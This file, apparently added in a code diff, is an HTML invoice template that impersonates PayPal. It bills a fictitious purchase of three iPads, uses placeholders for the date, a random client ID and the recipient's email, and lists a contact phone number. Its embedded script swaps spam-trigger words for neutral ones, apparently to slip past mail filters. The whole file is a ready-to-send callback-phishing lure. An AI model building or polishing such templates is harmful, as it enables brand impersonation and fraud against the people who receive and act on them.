@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Invoice</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #333;
+            background-color: #f9f9f9;
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .invoice-container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            page-break-inside: avoid;
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 30px;
+            border-bottom: 3px solid #2969b0;
+        }
+        h1 {
+            color: #2969b0;
+            margin: 0;
+            font-size: 28px;
+        }
+        .invoice-number {
+            color: #54acd2;
+            letter-spacing: 2px;
+            font-size: 1.1em;
+            margin: 5px 0;
+        }
+        .details {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px 0;
+            border-bottom: 1px solid #ddd;
+        }
+        .billing-details {
+            background: #f0f4f8;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .billing-title {
+            color: #54acd2;
+            font-weight: bold;
+            margin: 0 0 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        tr {
+            border-bottom: 1px solid #ddd;
+        }
+        td {
+            padding: 10px 0;
+        }
+        .text-right {
+            text-align: right;
+        }
+        .footer {
+            text-align: center;
+            color: #666;
+            font-size: 0.9em;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+        }
+        @media print {
+            body {
+                padding: 0;
+                background: white;
+            }
+            .invoice-container {
+                box-shadow: none;
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="invoice-container">
+        <div class="header">
+            <h1>PAYPAL</h1>
+            <p class="invoice-number">INVOICE #INV‑2024‑002</p>
+        </div>
+
+        <div class="details">
+            <div>
+                <p style="margin: 0 0 5px;"><strong>Issued:</strong> #DATE# </p>
+                <p style="margin: 0;"><strong>Client ID:</strong> CL‑ #RAND# </p>
+            </div>
+            <div style="text-align: right;">
+                <p style="margin: 0 0 5px;"><strong>Terms:</strong> Net 15</p>
+            </div>
+        </div>
+
+        <div class="billing-details">
+            <p class="billing-title">BILLING DETAILS</p>
+            <p style="margin: 0;">Tech Solutions Inc.</p>
+            <p style="margin: 0;"> #EMAIL# </p>
+        </div>
+
+        <table>
+            <tr>
+                <td>Apple iPad Pro 12.9″ × 3</td>
+                <td class="text-right">$3,297.00</td>
+            </tr>
+            <tr>
+                <td>Sales Tax (8.5%)</td>
+                <td class="text-right">$280.25</td>
+            </tr>
+            <tr>
+                <td style="font-weight: bold;">Total</td>
+                <td class="text-right" style="font-weight: bold;">$3,577.25</td>
+            </tr>
+        </table>
+
+        <div class="footer">
+            <p style="margin: 5px 0;">Payment processed through PayPal Business Services</p>
+            <p style="margin: 5px 0;">Contact: +1 888-370-8450</p>
+            <p style="margin: 5px 0;">INV-2024-002-TS-48259</p>
+        </div>
+    </div>
+
+    <script>
+        // Spam detection and replacement
+        document.addEventListener('DOMContentLoaded', function() {
+            // Common spam words and their replacements
+            const spamWords = {
+                'free': 'complimentary',
+                'win': 'receive',
+                'prize': 'award',
+                'guarantee': 'assurance',
+                'no cost': 'complimentary',
+                'risk-free': 'secure',
+                'special promotion': 'current offer',
+                'act now': 'proceed when ready',
+                'limited time': 'available',
+                'click here': 'select here',
+                'winner': 'recipient'
+            };
+            
+            // Function to replace spam words
+            function replaceSpamWords() {
+                const elements = document.querySelectorAll('p, td, div');
+                
+                elements.forEach(element => {
+                    let originalText = element.textContent;
+                    let newText = originalText;
+                    
+                    for (const [spamWord, replacement] of Object.entries(spamWords)) {
+                        const regex = new RegExp(`\\b${spamWord}\\b`, 'gi');
+                        if (regex.test(newText)) {
+                            newText = newText.replace(regex, replacement);
+                        }
+                    }
+                    
+                    if (newText !== originalText) {
+                        element.textContent = newText;
+                    }
+                });
+            }
+            
+            // Run spam replacement
+            replaceSpamWords();
+        });
+    </script>
+</body>
+</html>
